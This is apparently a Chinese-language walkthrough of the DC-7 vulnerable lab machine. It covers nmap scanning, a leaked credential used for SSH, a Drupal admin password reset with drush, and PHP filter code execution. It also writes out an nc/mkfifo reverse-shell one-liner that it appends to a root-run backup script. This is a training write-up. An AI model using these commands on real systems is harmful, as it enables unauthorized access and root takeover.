# 端口发现
nmap -sP 192.168.31.0/24
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668735253739-adff8ee5-6701-4a7f-9c67-3914c4bd01cf.png#averageHue=%2328313d&clientId=u19e9c27b-a566-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=336&id=u8d5c14f7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=336&originWidth=1062&originalType=binary&ratio=1&rotation=0&showTitle=false&size=97585&status=done&style=none&taskId=uf10a9619-86cb-4a51-85c1-291b10b3956&title=&width=1062)
nmap -p- -A 192.168.31.149
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668735286397-22562f46-ba96-410a-bf30-350f2cc595d0.png#averageHue=%2328313d&clientId=u19e9c27b-a566-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=509&id=u069bdb13&margin=%5Bobject%20Object%5D&name=image.png&originHeight=509&originWidth=1247&originalType=binary&ratio=1&rotation=0&showTitle=false&size=147602&status=done&style=none&taskId=u86ff3eea-d28f-4592-b1e4-0032c0eb741&title=&width=1247)
# web 突破
dirb 扫描网站后台没发现东西
访问 80 端口，
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668735671109-709b9a08-a69a-4482-ae91-cf225b44945c.png#averageHue=%2390908d&clientId=u0ed02e02-5029-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=957&id=u62d392fd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=957&originWidth=1919&originalType=binary&ratio=1&rotation=0&showTitle=false&size=95411&status=done&style=none&taskId=ua50de1d0-12e8-4dc1-9429-51dbc604bf2&title=&width=1919)
cms 是 drupal，先考虑 msf，
msf 模块对这个网站没有成功
搜索 网站下方的接入点
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668736065455-06d7373a-b221-4e8a-bdce-7d2bfd30272b.png#averageHue=%23323131&clientId=u16243cbc-df3f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=387&id=ufeae86dd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=387&originWidth=1031&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8611&status=done&style=none&taskId=uf6819ae5-48b1-4df5-91fe-deb60658c99&title=&width=1031)
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668736027102-35282c58-4ed7-4e35-8a66-cf5199433789.png#averageHue=%23fcfbf7&clientId=u16243cbc-df3f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=998&id=u94429a84&margin=%5Bobject%20Object%5D&name=image.png&originHeight=998&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=205982&status=done&style=none&taskId=ufade7770-475d-44fb-b6a6-d3063dec533&title=&width=1920)
点击 config.php
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668736088325-8aea4d6f-12d7-4376-9c93-c4c1a2545a30.png#averageHue=%23ecd4a6&clientId=u16243cbc-df3f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=621&id=ubae93833&margin=%5Bobject%20Object%5D&name=image.png&originHeight=621&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46710&status=done&style=none&taskId=uf07dfa4f-22ff-4259-90da-d4b0536f91e&title=&width=1920)
发现接入点默认的用户名和密码
dc7user : MdR3xOgB7#dW
尝试连接 ssh
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668736201038-c4b74076-f21f-4bd1-8c98-985ee51f6183.png#averageHue=%23293340&clientId=u16243cbc-df3f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=354&id=u7d66c019&margin=%5Bobject%20Object%5D&name=image.png&originHeight=354&originWidth=1008&originalType=binary&ratio=1&rotation=0&showTitle=false&size=103731&status=done&style=none&taskId=u1cecbc5a-bd45-4eef-aa8e-fb49637b158&title=&width=1008)
连接成功
先浏览一遍目录
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668736448891-8f094623-8228-4473-9a4b-5cd274c9af0e.png#averageHue=%23262f3b&clientId=u16243cbc-df3f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=304&id=u27c1aec9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=304&originWidth=1232&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75244&status=done&style=none&taskId=u075dce7f-2544-48fd-a4af-fc67d1bb3d8&title=&width=1232)
查看 mbox
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668736501349-838d260d-d568-4133-b8a4-4ef28551a6bf.png#averageHue=%23272f3b&clientId=u16243cbc-df3f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=465&id=u87a5c0a1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=465&originWidth=1247&originalType=binary&ratio=1&rotation=0&showTitle=false&size=121663&status=done&style=none&taskId=ud15df718-15c9-4bbd-ba53-a9f2d0fb150&title=&width=1247)
可以得知有个脚本在 /opt/scripts/backups.sh
查看 /opt/scripts/backups.sh
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668736616449-07d44d0b-8d8d-4545-83c2-ebadae8d29eb.png#averageHue=%2326303c&clientId=u16243cbc-df3f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=335&id=u69054ffa&margin=%5Bobject%20Object%5D&name=image.png&originHeight=335&originWidth=1254&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87950&status=done&style=none&taskId=uea1d58f6-974d-4c2e-9df7-fb6bc777ca5&title=&width=1254)
提示我们切换到 /var/www/html 使用 drush 命令
_Drush(Drush = Drupal + Shell)就是使用命令行命令来操作Drupal站点，它的命令格式与git类似，都是双字命令（drush + 实际的命令）_
使用 drush 来修改管理员的密码
drush user-password admin --password="123456"
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668736914712-3ca2d1a8-70ca-450e-83fe-47e9b1b4be96.png#averageHue=%23273240&clientId=uaded75b9-9f35-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=81&id=uf6a58162&margin=%5Bobject%20Object%5D&name=image.png&originHeight=81&originWidth=788&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20593&status=done&style=none&taskId=u83c7ebbd-72b8-4485-b6db-833f59a75fa&title=&width=788)
密码修改成功
去登录
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668736955493-f5460906-d2c9-4f28-90ba-197de761c65f.png#averageHue=%23f3f0e8&clientId=uaded75b9-9f35-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=523&id=u130acbca&margin=%5Bobject%20Object%5D&name=image.png&originHeight=523&originWidth=1363&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24287&status=done&style=none&taskId=u03452c01-86f7-460f-bd81-6f95d7e4d8b&title=&width=1363)
登录成功
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668736990726-49421e9f-33ec-49a9-b843-49cfa4ccede1.png#averageHue=%23f2f0db&clientId=uaded75b9-9f35-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=876&id=uc3163b5b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=876&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=97223&status=done&style=none&taskId=u48274f9f-cf17-47f4-b0bc-7ff8aa30bc6&title=&width=1920)
在 Extend -> Install new module 中下载安装 php 模块
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668737167098-b0123524-facd-420d-abf3-06349ec2e935.png#averageHue=%23eeeeeb&clientId=uaded75b9-9f35-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=735&id=u64994822&margin=%5Bobject%20Object%5D&name=image.png&originHeight=735&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112858&status=done&style=none&taskId=ufb81d72c-b27f-4b3d-aa42-3302725f708&title=&width=1920)
安装成功
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668737185719-7bb6052e-0da4-4802-9935-064f8b910176.png#averageHue=%23ebf5e7&clientId=uaded75b9-9f35-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=598&id=u2cfacc4d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=598&originWidth=1430&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39040&status=done&style=none&taskId=uf5ef02a0-79be-44b6-841e-4e2d4c16da0&title=&width=1430)
安装完成后，在 Extend -> PHP Filter（展开） -> Configure ->Add text format 中添加 php 文本类型
然后回到 Content -> Welcome to DC-7 -> Edit 中修改文本类型为 php
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668737971976-146ce71f-ac54-40e7-b441-370a387256a2.png#averageHue=%23efedeb&clientId=uaded75b9-9f35-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=850&id=u3206bb70&margin=%5Bobject%20Object%5D&name=image.png&originHeight=850&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=84191&status=done&style=none&taskId=u2ca01cd2-d3f1-4f95-a807-3fcc2b455c0&title=&width=1920)
将内容修改为反弹 shell
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668738023375-f334b0cc-c2c8-4704-8c4d-ef8f1fd74a7e.png#averageHue=%23f8f7f7&clientId=uaded75b9-9f35-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=535&id=u62ded042&margin=%5Bobject%20Object%5D&name=image.png&originHeight=535&originWidth=1225&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48635&status=done&style=none&taskId=u9e57944f-114b-488c-8a8b-dbc24e6b082&title=&width=1225)
kali 开启监听
保存预览
预览如下：
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668738115578-65139a6f-5135-4bad-a870-80497acd0838.png#averageHue=%23f4f3ee&clientId=uaded75b9-9f35-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=799&id=ub58cdfcb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=799&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38501&status=done&style=none&taskId=u683213e9-fc2a-4236-a093-80180c0419c&title=&width=1920)
反弹 shell 成功
python 优化 shell
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668738133650-db1ce623-b075-4fdb-acc6-f87bc264271e.png#averageHue=%232a323f&clientId=uaded75b9-9f35-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=210&id=u6b389265&margin=%5Bobject%20Object%5D&name=image.png&originHeight=210&originWidth=1037&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58088&status=done&style=none&taskId=u7ddd43b5-391c-43b5-b8e1-6d13ef3faab&title=&width=1037)
# 提权
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668738414766-34f10615-1afd-479e-9be3-a2015ff9169d.png#averageHue=%2327313e&clientId=uaded75b9-9f35-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=101&id=u472ddb2b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=101&originWidth=605&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16140&status=done&style=none&taskId=u01281358-27c3-4395-a2d7-26516c13306&title=&width=605)
backups.sh 这个脚本的文件所属组就是 www-data
写入反弹 shell 代码到这个脚本中
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.31.128 1234 >/tmp/f" >>backups.sh
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668738630313-0396c23a-89b1-4cc3-a85b-2ae3b2944105.png#averageHue=%2328313f&clientId=uaded75b9-9f35-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=61&id=ub23b20b8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=61&originWidth=1239&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20877&status=done&style=none&taskId=u3f4a2e8c-ee99-4a53-9898-4beb59a7bd3&title=&width=1239)
kali 监听 1234 端口
脚本文件大概15分钟执行一次
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668738660332-d7353e1e-552c-45ff-b9a1-168b6cb651a3.png#averageHue=%23283341&clientId=uaded75b9-9f35-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=172&id=ucf366c9c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=172&originWidth=695&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35866&status=done&style=none&taskId=u503d7ae7-56dc-4610-b0ec-276dde95725&title=&width=695)
拿 flag
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668738714034-e41f851f-6a37-4088-b862-1d8548b0880d.png#averageHue=%2328303c&clientId=uaded75b9-9f35-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=484&id=u735d35cb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=484&originWidth=1181&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76728&status=done&style=none&taskId=ufd9570dc-29db-4b89-9a8c-d2593da446c&title=&width=1181)















